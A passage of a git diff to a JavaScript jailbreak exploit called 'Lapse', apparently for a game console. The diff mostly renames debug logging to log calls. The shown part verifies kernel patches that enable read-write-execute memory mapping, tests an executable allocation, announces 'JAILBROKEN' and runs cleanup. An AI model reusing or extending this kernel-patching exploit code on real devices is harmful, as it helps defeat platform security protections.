+                const byte1 = Number(b1.and(0xff));
+                const byte2 = Number(b2.and(0xff));
+                if (byte1 === 0x37 && byte2 === 0x37) {
+                    log("  [OK] mmap RWX patch");
+                } else {
+                    log("  [FAIL] mmap RWX: [" + hex(mmap_offsets[0]) + "]=" + hex(byte1) + " [" + hex(mmap_offsets[1]) + "]=" + hex(byte2));
+                    all_patches_ok = false;
+                }
             } else {
-                debug("  [FAIL] mmap RWX: [" + hex(mmap_offsets[0]) + "]=" + hex(byte1) + " [" + hex(mmap_offsets[1]) + "]=" + hex(byte2));
+                log("  [SKIP] mmap RWX (no offsets for FW " + FW_VERSION + ")");
+            }
+
+            // 2. Test mmap RWX actually works by trying to allocate RWX memory
+            try {
+                const PROT_RWX = 0x7;  // READ | WRITE | EXEC
+                const MAP_ANON = 0x1000;
+                const MAP_PRIVATE = 0x2;
+                const test_addr = mmap(0, 0x1000, PROT_RWX, MAP_PRIVATE | MAP_ANON, new BigInt(0xFFFFFFFF, 0xFFFFFFFF), 0);
+                if (Number(test_addr.shr(32)) < 0xffff8000) {
+                    log("  [OK] mmap RWX functional @ " + hex(test_addr));
+                    // Unmap the test allocation
+                    munmap(test_addr, 0x1000);
+                } else {
+                    log("  [FAIL] mmap RWX functional: " + hex(test_addr));
+                    all_patches_ok = false;
+                }
+            } catch (e) {
+                log("  [FAIL] mmap RWX test error: " + e.message);
                 all_patches_ok = false;
             }
-        } else {
-            debug("  [SKIP] mmap RWX (no offsets for FW " + FW_VERSION + ")");
-        }
 
-        // 2. Test mmap RWX actually works by trying to allocate RWX memory
-        try {
-            const PROT_RWX = 0x7;  // READ | WRITE | EXEC
-            const MAP_ANON = 0x1000;
-            const MAP_PRIVATE = 0x2;
-            const test_addr = mmap(0, 0x1000, PROT_RWX, MAP_PRIVATE | MAP_ANON, new BigInt(0xFFFFFFFF, 0xFFFFFFFF), 0);
-            if (Number(test_addr.shr(32)) < 0xffff8000) {
-                debug("  [OK] mmap RWX functional @ " + hex(test_addr));
-                // Unmap the test allocation
-                munmap(test_addr, 0x1000);
+            if (all_patches_ok) {
+                log("All kernel patches verified OK!");
             } else {
-                debug("  [FAIL] mmap RWX functional: " + hex(test_addr));
-                all_patches_ok = false;
+                log("[WARNING] Some kernel patches may have failed");
             }
-        } catch (e) {
-            debug("  [FAIL] mmap RWX test error: " + e.message);
-            all_patches_ok = false;
-        }
-
-        if (all_patches_ok) {
-            debug("All kernel patches verified OK!");
         } else {
-            debug("[WARNING] Some kernel patches may have failed");
+            log("[WARNING] Kernel patches failed - continuing without patches");
         }
-    } else {
-        debug("[WARNING] Kernel patches failed - continuing without patches");
-    }
 
-    debug("Stage 5 completed - JAILBROKEN");
-    utils.notify("The Vue-after-Free team congratulates you\nLapse Finished OK\nEnjoy freedom");
+        log("Stage 5 completed - JAILBROKEN");
+        utils.notify("The Vue-after-Free team congratulates you\nLapse Finished OK\nEnjoy freedom");
+        
+        cleanup();
+
+        return true;
+    }
+    catch (e) {
+        log("Lapse error: " + e.message);
+        log(e.stack);
+        return false;
+    }
 }
 
 function cleanup() {
-    debug("Performing cleanup...");
+    log("Performing cleanup...");
 
     try {
         if (block_fd !== 0xffffffff) {
@@ -2686,30 +2914,20 @@ function cleanup() {
         }
         
         if (prev_core >= 0) {
-            debug("Restoring to previous core: " + prev_core);
+            log("Restoring to previous core: " + prev_core);
             pin_to_core(prev_core);
             prev_core = -1;
         }
         
         set_rtprio(prev_rtprio);
 
-        debug("Cleanup completed");
+        log("Cleanup completed");
 
     } catch (e) {
-        debug("Error during cleanup: " + e.message);
+        log("Error during cleanup: " + e.message);
     }
 }
 
 function cleanup_fail() {
     cleanup();
-}
-
-try {
-    lapse();
-    cleanup();
-}
-catch (e){
-    cleanup();
-    debug(e.message);
-    debug(e.stack);
 }
